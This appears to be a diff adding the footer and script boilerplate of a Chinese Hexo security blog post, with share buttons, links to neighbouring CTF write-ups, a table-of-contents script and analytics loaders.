+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">LANVNAL</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/websec/">
+                                    <span class="chip bg-color">websec</span>
+                                </a>
+                            
+                                <a href="/tags/note/">
+                                    <span class="chip bg-color">note</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,qq,wechat,weibo" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2017/03/26/di-yi-ci-ba-ji-de-chang-shi/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/coverimgs/0.jpg" class="responsive-img" alt="第一次靶机的尝试">
+                        
+                        <span class="card-title">第一次靶机的尝试</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            前言一组的表哥们搭了个靶机，这下有的玩了。
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2017-03-26
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2017/03/04/zheng-li/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/coverimgs/0.jpg" class="responsive-img" alt="整理">
+                        
+                        <span class="card-title">整理</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            整理（web）0X01（签到题）链接
+右键看源码，得到flag。
+0X02（md5 collision）链接
+源码：
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2017-03-04
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2017</span>
+            <a href="/about" target="_blank">LANVNAL</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">120.6k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2017";
+                    var startMonth = "3";
+                    var startDate = "15";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/LANVNAL" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:lanvnal@foxmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
